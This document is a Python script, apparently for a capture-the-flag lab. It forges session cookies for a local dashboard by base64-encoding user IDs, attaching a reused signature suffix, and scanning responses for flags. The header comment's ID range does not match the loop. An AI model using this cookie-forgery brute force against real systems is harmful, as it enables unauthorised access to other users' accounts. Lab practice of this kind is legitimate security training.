import time
import requests
import base64
import json
import re

# Configuration
url = "http://127.0.0.1:33187/dashboard"
timestamp_signature = ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

# Create a session for connection reuse
session = requests.Session()
session.verify = False

print("[*] Session cookie brute force test")
print("[*] Testing user IDs 10000-10100\n")

# First, get baseline with our original user_id (10032)
try:
    baseline_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ" + timestamp_signature
    print("[*] Getting baseline response for user_id=10032...")
    resp = session.get(url, cookies={'session': baseline_cookie}, timeout=10)
    baseline_size = len(resp.text)
    baseline_status = resp.status_code
    print(f"    Status: {baseline_status} | Size: {baseline_size}B")
    time.sleep(1)  # Wait after baseline
except Exception as e:
    print(f"[!] Baseline error: {e}")
    baseline_size = 0
    baseline_status = 0

# Track findings
found = []
flags = []
errors = 0

# Test user IDs with delays
for uid in range(10000, 10050):  # Test smaller batch first
    try:
        # Build cookie
        payload = json.dumps({"user_id": str(uid)})
        encoded = base64.b64encode(payload.encode()).decode().rstrip('=')
        cookie = encoded + timestamp_signature
        
        # Test
        resp = session.get(url, cookies={'session': cookie}, timeout=10)
        size = len(resp.text)
        status = resp.status_code
        
        # Check matches
        flag_matches = re.findall(r'FLAG\{[^}]+\}', resp.text)
        
        # If different from baseline or has flag
        if size != baseline_size or flag_matches:
            found.append({'uid': uid, 'size': size, 'status': status})
            if flag_matches:
                flags.extend(flag_matches)
                print(f"[!] FLAG! user_id={uid}: {flag_matches}")
            else:
                print(f"[+] Different response: user_id={uid} (Size: {size}B, Status: {status})")
        
        # Progress
        if uid % 10 == 0:
            print(f"  Progress: {uid - 10000}/50 tested")
        
        time.sleep(0.5)  # Longer delay between requests
        
    except Exception as e:
        errors += 1
        if errors < 3:
            print(f"[!] Error at uid {uid}: {str(e)}")
        time.sleep(2)  # Extra wait on error

# Results
print("\n[*] Test complete")
print(f"Found different responses: {len(found)}")
print(f"Errors encountered: {errors}")

if found:
    print("\nAccessible user IDs:")
    for item in found:
        print(f"  {item['uid']} (Size: {item['size']}B, Status: {item['status']})")

if flags:
    print(f"\n[!] FLAGS FOUND:")
    for flag in flags:
        print(f"  {flag}")
else:
    print("\n[*] No flags found in first 50 IDs")
